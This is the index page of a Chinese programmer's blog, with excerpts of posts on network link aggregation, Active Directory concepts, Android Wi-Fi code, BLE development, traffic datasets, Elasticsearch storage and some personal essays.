<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="菜鸟程序员博客">
		<meta property="og:title" content="菜鸟程序员博客" />
<meta property="og:description" content="菜鸟程序员博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://cainiaoprogram.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="菜鸟程序员博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4ed876cf8056939fa187a8f43878893c/" rel="bookmark">
			以太网链路聚合（手工负载分担及LACP配置）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		链路聚合前言概述
链路聚合是将多个物理接口捆绑为一个逻辑接口，来达到增加链路带宽的目的，在实现增大带宽的同时，链路聚合采用备份链路的机制，还可以有效提高设备之间链路的可靠性。
链路聚合优势
传统技术中，网络规模扩大，需增加带宽，通常需更换高速率的接口板和更换支持高速率接口板的设备的方式，此种方案需要耗费高额的费用，且不灵活。
链路聚合能够提高链路带宽，增强网络可用性，支持负载分担。
链路聚合应用场景
链路聚合一般部署在核心节点（骨干链路），以提升整个网络的数据吞吐量。
链路聚合模式
链路聚合有两种，分别是手工负载分担模式与LACP模式。
模式概述手工负载分担模式手工负载分担模式下所有活动接口都参与数据的转发，分担负载流量LACP模式LACP模式则支持备份 数据流控制
在一个聚合口中，聚合链路两端的物理口（即成员口包含二层/三层接口）的所有参数必须一致，包括物理口的数量，传输速率，双工模式和流量控制模式。
数据流与数据流控制
数据流可以看作是一组MAC地址和IP地址相同的帧，如两台设备间的SSH或SFTP连接可以看做一个数据流。
数据流在聚合链路传输，数据顺序必须保持不变。
普通链路与链路聚合的传输方式
普通链路即未配置链路聚合的链路，用一条物理链路来传输数据，那么一个数据流中的帧总是能按正确的顺序到达目的地。
链路聚合模式中，多条物理链路被绑定成一条聚合链路，一个
数据流中的帧通过不同的物理链路传输。如果第一个帧通过一条物理链路传输，第二个帧通过另外一条物理链路传输，这样一来同一数据流的第二个数据帧就有可能比第一个数据帧帧到达对端设备，从而产生接收数据包乱序的情况。
逐流负载分担
为避免数据包乱序，Eth-Trunk采用逐流负载分担的机制，此机制把IP或MAC通过HASH算法生成不同HASH-KEY值，根据KEY值 在Eth-Trunk转发表中寻找对应的出接口，保证了同一数据流的帧在同一条 物理链路转发，又实现了流量在聚合组内 各物理链路的负载分担。
逐流负载分担可以保证数据包的顺序，但无法保证带宽利用率。
负载分担类型
负载分担的类型主要包括以下几种，用户可以根据具体应用选择丌同的负载分担类型。
序号类型1根据报文的源MAC地址进行负载分担2根据报文的目的MAC地址进行负载分担3根据报文的源IP地址进行负载分担4根据报文的目的IP地址进行负载分担5根据报文的源MAC地址与目的MAC地址进行负载分担6根据报文的源IP地址与目的IP地址进行负载分担7根据报文的VLAN、源物理端口等对L2、IPv4、IPv6和MPLS报文进行增强型负载分担。 以太网接口和链路配置 拓扑图
在2台华为的S5700系列交换机配置链路聚合功能，以提高交换机间链路带宽及可靠性。
首先修改交换机的设备名称，然后查看S1上G0/0/9和G0/0/10接口的详细信息。
# undo terminal monitor //关闭终端显示 system-view sysname S1 display interface GigabitEthernet 0/0/9 //查看G0/0/9接口详细信息 display interface GigabitEthernet 0/0/10 # 在S1、S2在配置接口的速率100Mbits和全双工模式之前应先关闭接口的自协商功能
# interface GigabitEthernet 0/0/9 undo negotiation auto //关闭自协商 speed 100 //速率 duplex full //全双工 quit interface GigabitEthernet 0/0/10 undo negotiation auto speed 100 duplex full quit 手动链路聚合模式 配置手动模式的链路聚合，在S1和S2创建Eth-trunk1，将接口加入Eth-Trunk1（注意：将接口加入Eth-Trunk前需确认成员接口下没有任何配置）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4ed876cf8056939fa187a8f43878893c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4ecdf33861f24511271f2a8158d9a880/" rel="bookmark">
			域控制器学习笔记(1)域基本概念
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 域基本概念1.域概述：2.域中的角色3.域之间AD数据库同步4.特殊的域控制器5.域和活动目录的规划6.多域的术语7.域间的信任关系8.什么是站点？9.域的规划建议 域基本概念 域（Domain）是企业网络钟人为定义的一组计算机和用户的集合，目的是为了对集合钟的各种资源对象进行统一和集中的管理。
活动目录（Active Directory）是一种小型数据库，通过定义域内的各种对象的属性并在逻辑上形成层次化结构，便于更有效的展示和管理。
域控制器（Domain Controller）存放活动目录数据库的服务器，运行ADDS（Active Directory Domain Service）服务。
1.域概述： 域提供了一个集合的环境，在集合中，包含了各种各样的对象（计算机、用户），对象存放于基于文件集的数据库当中，名称就叫活动目录，活动目录存放在域控制器上，一个企业可以拥有多台域控制器，实现高可用和负载均衡。
强制终端计算机及用户的安全策略及桌面/应用环境，并可实现批量和自动部署，减轻IT人员日常的管理难度和工作强度。域中的各类服务和资源（文件和打印共享等）的访问控制可以灵活的与企业的层次化组织架构相组合，满足复杂的权限分配等管理需求。统一的身份验证手段，可与多种windows应用服务（如Exchange，Sharepoint等）及第三方软件集成，实现单点登录，改善用户在多业务中切换中的操作体验。 总结：
第一个方面，协助IT管理人员，进行企业当中的计算机及用户的一些参数的统一的自动部署，通过域中的组策略等管理手段实现批量和自动的参数部署，减轻IT管理人的工作难度及强度。
利用权限管理的机制，有效对企业中资源进行访问控制（如文件共享服务器、打印机）供不同部门不同用户使用，对设备的权限进行控制。
通过域和活动目录，实现企业的统一的身份验证，现在企业部署的应用程序越来越多，如果每套应用程序都有一套登录的账户系统，那么对用户来说，使用体验是极差的，每一套业务系统都要用户名和密码，每一次使用都要重复登录，但是如果拥有域和活动目录的一个功能的话，就可以使得应用程序使用活动目录来实现统一的身份验证及单点登录，不仅支持windows，如（Exchange，Sharepoint原生产品能实现单点登录），及其它第三方产品也可以再二次开发，也可以支持域。
2.域中的角色 域控制器（Domain Controller，简称DC），每个企业可以有多台域控域内的成员服务器，企业的服务器操作系统加入了域，如果域控是windows server 2012成员服务器3可以是win 2008，并没有强制要求版本相同，包括linux和mac都可以加入，但是非微软的计算机加入到域控可能再功能方面会受到一些局限性，可能需要应用第三方插件，才能够完成较复杂管理和监控任务。域内的终端计算机，前面谈到微软的AD活动目录的数据库，它本质上是一个文件，文件是放在域控制器上的，默认保存于与控制器的C/windows/ntds目录当中，你打开AD数据库文件默认保存目录中
.dit活动目录的主数据库文件，文件容量不会很大，活动目录文件当中不会包含海量数据，哪怕上万PC，每个对象存储的数据 也是比较小，常见就是几百M。
辅助文件 （事务日志、检查点文件）配合处理域控由于特殊原因（断电、系统故障）造成用户要往活动目录数据时，还未来得及写入，就造成了故障，重启后，上一次写入的数据产生了丢失？怎么处理呢？借助事务日志的文件，事务日志文件不会很大，每个事务日志文件按照顺序进行编号，当有一个写入请求时，写入请求再内存当中未来得急写入到主数据中，会先往事务日志当中去写入，事务日志较小，会很快，在事务日志当中，哪怕计算机断电重启，由检查点文件去记录上一次哪个日志哪个数据没有写入主数据文件，可以利用检查点文件数据写入的恢复，就可以确保域控制器的工作环境因为域控特殊原因，造成数据的丢失。 预留文件主要作用防止域控制器某种原因硬盘被写满，一旦域控制器被写满，它无法进行正常工作，所以，在硬盘写满前，通过预留文件功能，把一些数据写到预留文件中。
AD数据库维护过程中必要时可进行服务启停、文件集重定向、脱机管理、备份及恢复等操作。
3.域之间AD数据库同步 AD数据库会定时或在发生改变时自动在DC之间相互同步复制，同步复制的频率和时间窗口可以配置和定义。
企业当中，如果有三台域控制器，活动目录也有三份，三份应该是一模一样，如果管理员登录了一台域控，修改了参数，那么其它两台也会进行同步。
域控之间的同步，可以实现高可用的实现，实现就是直接同步参数增量的变化。
4.特殊的域控制器 只读域控制器（Read Only Domain Controller）
Rodc保存域控制器中AD数据库的只读副本不允许在RODC本地对数据库做出更改操作RODC适合部署在没有本地管理需求的远程分支机构 应用场景（使用非常普遍）
企业规划了一个域，在一个偏远分支机构中，本地用户量不大，无IT管理员，但还是需要放置一个域控制器，可以改善用户的本地登录的体验，此时，使用其它城市域控制器活动目录同步到此分支的域控中，将其做成RODC，好处：如果域控被人非法登录，它是没有办法对相关数据进行改动，保证了安全，如果不是RODC，修改了域控的权限，那么就会反向的同步到其它活动目录，非常危险。
sqa
很多企业，特别是在各地有一些工厂的一些公司，在分支部署的一些域控制器都是RODC，只会单向进行数据同步，只有登录总部域控制器才能进行修改操作。
全局编录服务器（Global Category Server）
GC是一种特殊的域控制器，一个域至少部署一台GC用于多域环境中和其它域进行数据同步（但并不是同步全部数据，通常需要同步的数据仅占AD数据库总量的5%~10%），以便优化Exchange server等应用的全局或跨域搜索的效率。 应用场景
企业中部署了两个域，存在一个问题：由于域是管理的边界，在一个域的计算机的信息，默认不需要传递到其它域，所有的数据的同步只是在同一个域当中。
GC的作用：可以在其它域数据同步时，筛选对象属性某一种进行选择，不需要同步全部数据。
5.域和活动目录的规划 需要结合企业的业务环境 和业务需求
什么适合需要多域?
一个域可以包含100万个对象，绝大多数企业在技术上只需要有一个域。
出现以下需求情况时可能需要考虑多域的部署
IT管理政策上需要有分离或独立的IT管控边界公司重组或合并等原因影响域的变化域的改造和迁徙需要同时新旧域的并存 6.多域的术语 7.域间的信任关系 信任关系可实现跨域的身份验证和资源访问，如果域之间没有信任关系，每个域的用户只能访问本域中的资源，根据场景的不同，部分信任关系时默认存在的，部分时需要另行手工配置的。
8.什么是站点？ 站点（site）是指同一个域内包含特定IP子网并与特定域控制器关联的网络，部署多个站点的目的是优化站点间DC的复制同步，同时使克服端能够和就近的DC优先通信，优化登录验证的操作。
9.域的规划建议 域的规划没有统一的标准，但建议尽可能简化，尽量的使用单域，没有特殊要求尽量使用单域，工作量较小。
企业规模、网络带宽、IT管控界面、法律政治要求、公司并购计划是常见的考虑因素。
企业域规划的一般建议：
中小企业使用单域、总部下有分公司可使用父子域或单域多站点，集团下有多个独立的业务子公司使用单林多域。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b16b32ea1bfa1f02c857e107170a1a92/" rel="bookmark">
			Android wifi连接和获取IP分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		wifi 连接&amp;获取IP 流程图 代码流程分析 一、关联阶段 1. WifiSettings.submit – &gt; WifiManager WifiSettings 干的事情比较简单，当在dialog完成ssid 以及密码填充后，直接call WifiManager save 即可WifiManager 收到Save 之后，就开始了wifi 连接之旅 packages/apps/Settings/src/com/android/settings/wifi/WifiSettings.java void submit(WifiConfigController configController){ ... mWifiManager.save(config, mSaveListener); } 2. WifiSettings.submit – &gt; WifiManager WifiManager 这里相当于传达室，信件到了，然后按个铃铛，把信息传达给WifiSerivceImpl主要是将SAVE_NETWORK 给到 WifiService（WifiServiceImpl 是真正干活的） frameworks/base/wifi/java/android/net/wifi/WifiManager.java public void save(WifiConfiguration config, ActionListener listener) { getChannel().sendMessage(SAVE_NETWORK, 0, putListener(listener), config); } 3. WifiServiceImpl --&gt; WifiStateMachine WifiServiceImpl又将 SAVE_NETWORK 送到中级cmd处理站： WifiStateMachine这里扩展一下，如我们的移除热点（其实也通过Settings 将remove cmd 送到WifiServieImpl进行下一步传输） frameworks/opt/net/wifi/service/java/com/android/server/wifi/WifiServiceImpl.java private class ClientHandler extends WifiHandler { case WifiManager.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b16b32ea1bfa1f02c857e107170a1a92/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d408b45dc4860c44cc3971c48b3a3f46/" rel="bookmark">
			复制文本到剪贴板
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 /** * @description doCopy 复制文本到剪贴板 * @export * @param {*} text */ export function doCopy(text) { if (document.hasFocus() &amp;&amp; navigator?.clipboard?.writeText) { // 读取剪贴板 // navigator.clipboard.readText().then((clipText) =&gt; {console.log('clipText=',clipText)}) // 写入剪贴板 navigator.clipboard.writeText(text).catch((err) =&gt; console.error(`clipboard.writeText：${err}`)) return } const textarea = document.createElement('textarea') textarea.value = text textarea.select() document.execCommand('Copy') } //测试 setTimeout(()=&gt;{ doCopy('text') console.log(1) },2000) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7a0e3898be6e3c7476e76f498443a442/" rel="bookmark">
			如何从T-N曲线判断电机选对了没有
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我的知乎原文：https://zhuanlan.zhihu.com/p/670156320?
如果你是一个刚入行的电机工程师，刚刚参加了一个新产品的开发，在众多电机供应商中让你去挑选一款合适的电机，该从哪个角度去入手呢？
今天这篇文章就从T-N曲线的角度来解析如何挑一款极具性价比的电机（最精准的刀法是建立在对电机原理的透彻理解下的）
下面这张图是我在一家电机厂家官网下载到的T-N曲线图：
首先，可以看到这张图的横轴是转速，纵轴是转矩，图中有两条黑色的曲线，B描述的是短时工作区域，A描述的是连续工作区域，（有的人也会把B曲线叫做TN曲线，把A曲线叫做S1曲线）。顾名思义，短时工作区域表示电机只能短暂维持这个状态的转速和扭矩，而电机可以长时间工作在连续工作区域。
决定短时工作区域的是电机的短时电气特性：瞬时电流、瞬时电压，决定持续工作区域的是电机的持续电气特性：持续电流、持续电压、电机持续温升，区分这两条曲线非常重要。
其实判断一款电机能否正常使用，最直观的是拿出一个T-N需求曲线：
如果说红色的曲线全都位于该电机的工作区域内，那大概是没问题的，红色的T-N曲线通常来自于实验数据，或者是仿真计算的结果。一般的红色曲线是瞬时的TN曲线，那怎么判断持续的TN曲线是否满足要求呢？
如果把TN曲线拆分开来，拿到转速-时间曲线和扭矩-时间曲线：
把所有的转速和扭矩曲线求积分，那么会得到这个工作过程中的平均转速和平均扭矩。
如果该点 在S1曲线内，那么说明持续的TN曲线也是能满足你项目上的需求的。
如果拿不到需求的TN曲线，或者是不愿意去计算平均转矩/平均转速，那么看这些重要指标：
最大转速、最大转矩（一般这里说的最大都是在瞬时工况下的）（图中标红的点）
如果你的项目有明确的转速要求，那么一定要看电机的datasheet中的最大转速达到了你的条件。
最大转矩如果产品经理没有给出明确的定义，那么可以自行通过需要的角加速度，电机惯量，负载转矩，摩擦力矩大致估算，同时保留一定的安全余量。
PS：在实际应用中，尤其需要关注摩擦力矩，TN曲线扣除摩擦力矩的部分才是实际输出到电机轴上的剩余扭矩
堵转扭矩
堵转扭矩用于评估 电机带负载保持静止不动的能力，这个参数是生命参数，不能说电机反而被负载拽着跑掉下来，通常参数的余量会适当留足一些。
下面是一些我曾经的疑问，可以当作思考题给大家分享下：
为什么刚开始会有一段水平的扭矩段？
为什么当转速高到一定程度以后，扭矩会随着转速的升高而下降？
TN曲线的转速为什么不能无穷大？
这些都可以归纳为同一个问题：TN曲线是怎么绘制的？
至于参考答案，可以看下我之前写的一篇文章，
https://zhuanlan.zhihu.com/p/599684098
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fa1a155b79e455cb91fc6d935747ad37/" rel="bookmark">
			[Python3]描述输入一串字符，将输入中的，在＜＞里面的，没有前导0的少于4位的整数依次输出。单独的0也要输出。输入第一行是整数n，表示后面一共有n个字符串接下来有n行字符串输出对每个字符串，输出
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		描述
输入一串字符，将输入中的，在&lt;&gt;里面的，没有前导0的少于4位的整数依次输出。单独的0也要输出。
输入
第一行是整数n，表示后面一共有n个字符串
接下来有n行字符串
输出
对每个字符串，输出题目要求的结果
样例输入
3 abc&lt;123&gt;cd&lt;0456&gt;,78,123&lt;3554&gt;1a&lt;38&gt;ab&lt;08&gt;,1&lt;0&gt;111cd&lt;3&gt; &lt;12&gt;cd&lt;77347&gt; &lt;&gt; 样例输出
123 38 0 3 12 NONE 代码如下：
import re # 读取行数 n = int(input()) # 对每一行进行处理 for _ in range(n): # 读取字符串 s = input() # 使用正则表达式查找所有尖括号内的数字 matches = re.findall(r'&lt;(\d+)&gt;', s) # 初始化标记，用于检查是否有符合条件的数字被找到 found = False # 遍历所有匹配的数字 for num in matches: # 检查数字是否没有前导0且少于4位，或者是单独的0 if (num == '0') or (num[0]!='0' and len(num) &lt; 4): # 输出符合条件的数字，并设置标记为True print(num, end=' ') found = True # 如果没有找到任何符合条件的数字，则输出'NONE' if not found: print('NONE', end='') # 每处理完一行字符串后输出一个换行符 print() 运行结果如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fa1a155b79e455cb91fc6d935747ad37/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/abebbe2f607420be7fc1089c8fafe1cd/" rel="bookmark">
			千问base模型安装过程遇到的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 安装flash-attention 问题 ERROR: Could not build wheels for flash-attn, which is required to install pyproject.toml-based projects
解决：直接下载：
https://objects.githubusercontent.com/github-production-release-asset-2e65be/494232964/6db87fd2-f8f4-4443-9209-aa42fd99c5ef?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20231204%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20231204T121952Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=6d8bf07b27bc0c0f5787c9a29e3935834aeb912f8c8798f810e7c45ed6700df8&amp;X-Amz-SignedHeaders=host&amp;actor_id=10993415&amp;key_id=0&amp;repo_id=494232964&amp;response-content-disposition=attachment%3B%20filename%3Dflash_attn-2.3.6%2Bcu118torch2.0cxx11abiFALSE-cp310-cp310-linux_x86_64.whl&amp;response-content-type=application%2Foctet-stream 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33046a66ca279419e742964a0fce68f5/" rel="bookmark">
			马斯克没继续的工作，我帮他继续下去
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		还记得当初自己为什么选择计算机？ 埃隆·马斯克的第一份工作是在加拿大开始的。17岁时，他来到加拿大，但他的寻亲不遇，为了生存，他不得不打各种零工，包括在农场中种蔬菜和打扫粮仓，以及在木材厂锅炉房烧锅炉。
后来，他在加拿大读大学时，开始在彼得银行实习。而在美国读大学时，他分别在硅谷的品尼高研究所和火箭科学游戏公司实习。在品尼高研究所，他研究超级电容器，可用于电动汽车。在火箭科学游戏公司，他做视频游戏，并成为程序员，通宵工作。他是一个水平极高的互联网黑客，但觉得游戏行业不够大。马斯克之所以不继续从事计算机工作，是因为他认为计算机科学是解决现实问题的工具，而不是创新的终点。他想要通过将技术和工程相结合来解决人类面临的更大挑战。因此，他转而从事互联网、能源和太空等领域的创新工作。
现在，我也在计算机的道路上了！
先说说马斯克。马斯克选择计算机行业的原因，一方面是他对科技行业的发展趋势有深刻的理解，认为计算机科学将是推动社会进步的重要力量。同时，他也看到了计算机科学在解决现实问题方面的巨大潜力，认为这是一个可以实现他远大理想的重要领域。
此外，马斯克在年轻时就对计算机科学产生了浓厚的兴趣，他曾阅读了大量的计算机科学相关书籍，并自学了编程等技能。他对计算机科学的应用前景充满信心，并认为自己可以通过在这个领域的学习和研究，为未来的科技发展做出贡献。总的来说，马斯克选择计算机行业是出于对科技行业的热爱、对计算机科学的研究兴趣以及对未来的远见卓识。
而对我而言，在当今社会，计算机技术已经渗透到我们生活的方方面面，无论是工作、学习还是娱乐。对于我来说，选择从事计算机工作是因为我对这个领域的热爱和对其广阔发展前景的认可。
首先，计算机科学是一门充满挑战和乐趣的学科。它涉及到逻辑、算法、数据结构等多个方面，需要我们运用创新思维和解决问题的能力。在解决计算机科学问题时，我感到如同探险家在未知领域中探索一样，每一次的突破都让我兴奋不已。
其次，计算机行业的发展速度令人惊叹。从早期的计算机到现在的智能手机，从互联网的兴起到现在的大数据和人工智能时代，计算机领域不断带来新的机遇和挑战。我深知，只有不断学习和更新自己的知识，才能在这个行业中保持竞争力。
此外，计算机科学的应用范围广泛，几乎覆盖了所有行业。无论是金融、医疗、教育还是娱乐，都需要计算机技术的支持。因此，选择从事计算机工作意味着我有机会参与到各行各业的发展中去，这让我感到十分兴奋。
最后，我想说的是，计算机工作并不是一种孤独的职业。在这个领域中，我们需要与各种各样的人合作，包括其他程序员、设计师、产品经理等。这种跨学科的合作有助于我拓展视野，提高沟通协作能力，使我在职业生涯中更加全面地发展自己。
总的来说，我从事计算机工作是因为对这个领域的热爱和对未来发展的信心。我相信，在这个充满挑战和机遇的行业中，我将有机会实现自我价值并为社会做出贡献。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d14c0567bd4719f6c5d489d9f7590802/" rel="bookmark">
			Harmony Ble蓝牙App（三）特性和属性
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Ble蓝牙App（三）特性使用 前言正文一、获取属性列表二、属性提供者三、获取特性名称四、特性提供者五、加载特性六、源码 前言 在上一篇中我们完成了连接和发现服务两个动作，那么再发现服务之后要做什么呢？发现服务只是让你知道设备有什么服务，可以做什么事情。
正文 本篇要做的是显示服务下的特性，首先我们了解一下特性的基本知识。在蓝牙低功耗（BLE）中，特性（Characteristic）是蓝牙设备提供的一种数据单元，用于描述设备的某个属性或功能。特性包含了一系列的属性和值，可以用于读取、写入和通知数据。
BLE特性相关的关键概念和说明：
UUID（Universally Unique Identifier）：每个特性都会有一个唯一的UUID，用于标识该特性。值（Value）：特性包含一个值，可以是字节数组、字符串或其他数据类型。该值代表特性的当前状态或数据内容。属性（Properties）：特性具有一组属性，包括读、写、通知等。属性决定了可以对特性进行哪些操作。读（Read）：允许外部设备从特性中读取当前的值。写（Write）：允许外部设备向特性写入一个新的值。通知（Notify）：当特性的值发生变化时，可以通过通知方式将新的值发送给订阅该特性的外部设备。描述符（Descriptor）：特性可以附带一个或多个描述符，用于提供关于特性的额外信息或配置。 使用BLE特性，可以实现各种功能和数据交互，例如传感器数据的读取、设备状态的监控、远程控制等。特性的读写和通知操作可以通过与蓝牙设备的交互来实现。需要注意的是，BLE特性的操作和功能是由设备的厂商定义的，并在设备的GATT（Generic Attribute Profile）配置文件中进行描述。
首先理清一下思路，我们现在知道服务下面有特性，特性下面有一些属性值，其中属性（Properties）尤为重要，因为它决定了你的特性可以进行那些操作。用一个图来说明服务，特性，属性之间的关系。
一、获取属性列表 下面我们先获取最下面的属性，这是一个列表，属性值的处理有一些不同，首先我们在BleUtils中增加一个函数，代码如下所示：
/** * 获取属性 */ public static List&lt;String&gt; getProperties(int property) { List&lt;String&gt; properties = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; 8; i++) { switch (property &amp; (1 &lt;&lt; i)) { case 0x01: properties.add("Broadcast"); break; case 0x02: properties.add("Read"); break; case 0x04: properties.add("Write No Response"); break; case 0x08: properties.add("Write"); break; case 0x10: properties.add("Notify"); break; case 0x20: properties.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d14c0567bd4719f6c5d489d9f7590802/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c66377455cd8574076af0de49b60b751/" rel="bookmark">
			PEMS数据集与.h5文件读取
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PEMS（Performance Measurement System）是加利福尼亚州交通管理系统的一部分，提供了用于交通流量和性能测量的数据。PEMS数据集通常提供了大量的交通流量、速度、占有率等方面的时间序列数据。
在PEMS数据集中，数据的格式通常是时间序列格式，其中包含了对交通流量、速度、占有率等指标的观测。这些数据可以以CSV（逗号分隔值）格式或其他结构化的格式呈现。
以PEMS-BAY数据集为例：
HDF5 文件可以包含多个组和数据集，因此上述示例使用 visititems 方法递归地访问文件中的每个项目，并打印它们的类型（Group 或 Dataset）。如果你知道文件结构，也可以直接访问特定的组和数据集。
import h5py file_path = 'D:\\车流量预测\\模型\\data\\pems-bay.h5' with h5py.File(file_path,'r') as file: #查看文件中的组和数据集 def print_hdf5_item(name, obj): if isinstance(obj, h5py.Group): #isinstance用来检查一个对象是否是指定类型的实例 print(f"Group:{name}") elif isinstance(obj, h5py.Dataset): print(f"Dataset: {name}") file.visititems(print_hdf5_item) dataset = file['speed/axis0'] print(f"speed/axis0 = {dataset[()]}") dataset = file['speed/axis1'] print(f"speed/axis1 = {dataset[()]}") dataset = file['speed/block0_items'] print(f"block0_items = {dataset[()]}") dataset = file['speed/block0_values'] print(f"block0_values = {dataset[()]}") 输出为;
Group:speed Dataset: speed/axis0 Dataset: speed/axis1 Dataset: speed/block0_items Dataset: speed/block0_values speed/axis0 = [400001 400017 400030 400040 400045 400052 400057 400059 400065 400069 400073 400084 400085 400088 400096 400097 400100 400104 400109 400122 .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c66377455cd8574076af0de49b60b751/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1102a34513a190380c3d35588811b726/" rel="bookmark">
			ES 的存储原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、ES是什么
二、ES基本结构
2.1、结构图
2.2、基本概念
2.3、与关系数据库概念的类比
2.4、数据如何读写
2.5 容灾能力
三、ES的文件存储结构
每个分片的事务日志（Transaction Log）
Index文件夹内文件含义(lucene文件夹)
四、存储步骤
页缓存 （文件系统缓存）
​编辑
整体存储步骤流程图
4.1、写入缓存（内存）
4.2、refresh 刷入页缓存（文件系统缓存）
4.3、刷入 refresh 页缓存的同时，写入 translog
4.4、数据 flush 落盘 disk 4.5、Translog的页缓存（内存缓存）
4.6 flush
4.7 整体存储步骤讲解
五、Es的其他操作
5.1、Doc删除
5.2、Doc更新 = 删除 + 新增
5.3、段合并
参考文章
一、ES是什么 一个分布式的实时文档存储，每个字段可以被索引与搜索
一个分布式实时分析搜索引擎
能胜任上百个服务节点的扩展，并支持 PB 级别的结构化或者非结构化数据
基于Lucene，隐藏复杂性，提供简单易用的Restful API接口、Java API接口（还有其他语言的API接口）。ES是一个可高度扩展的全文搜索和分析引擎。它能够快速地、近乎实时地存储、查询和分析大量数据。
二、ES基本结构 2.1、结构图 简单讲解：
Node相当于服务器，上图就是4个服务器，也叫4个数据节点比如我的商品数据表的index是 es_product ，我可以把数据切割成3份，那么每一份就是一个 Shared（类似于Mysql的table分表），比如上图的index1，有3个主Shared假如我想把不同业务的数据分开存，比如我有外卖的数据，有商超的数据，那么加前缀，waimai_es_product，shangcha_es_product（类似于Mysql的分库）R-shared就是副本shared，只负责复制Primary给下来的数据，只有当primary挂了，他才上位。（保证系统稳定性，为什么P-s1和 R-s1不能放在一起，那放一起一起挂了不就完犊子了） 2.2、基本概念 集群（cluster）
ES集群由若干节点组成，这些节点在同一个网络内，cluster-name相同
节点（node）
一个ES的实例，本质上是一个java进程，生产环境一般建议一台机器上运行一个ES实例。节点可以分布在不同的机房。
节点有如下分类：
1、master节点：集群中的一个节点会被选为master节点，它将负责管理集群范畴的变更，例如创建或删除索引，添加节点到集群或从集群删除节点。master节点无需参与文档层面的变更和搜索，这意味着仅有一个master节点并不会因流量增长而成为瓶颈。任意一个节点都可以成为 master 节点。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1102a34513a190380c3d35588811b726/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5771ec73468945c8cfd9731894e878dc/" rel="bookmark">
			METR-LA数据集介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		METR-LA（Metro Traffic Los Angeles）数据集是一个用于交通流量预测的常用数据集，主要用于研究和评估交通预测算法的性能。该数据集包含了洛杉矶地区的交通传感器数据，可以用于建立和验证交通流量预测模型。
数据格式：
METR-LA数据集的格式通常是时间序列数据，其中包含了交通传感器在不同时间点上的流量信息。常见的数据格式可能包括以下几列：
timestamp： 时间戳，表示观测的时间点。flow（或类似指标）： 表示在该时间点上的交通流量，通常是车辆通过传感器的数量。其他特征： 可能包括其他相关的特征，如速度、密度等，以更全面地描述交通状况。 例子：
下面是一个简化的METR-LA数据集的示例，假设有三个传感器，每隔15分钟记录一次交通流量：
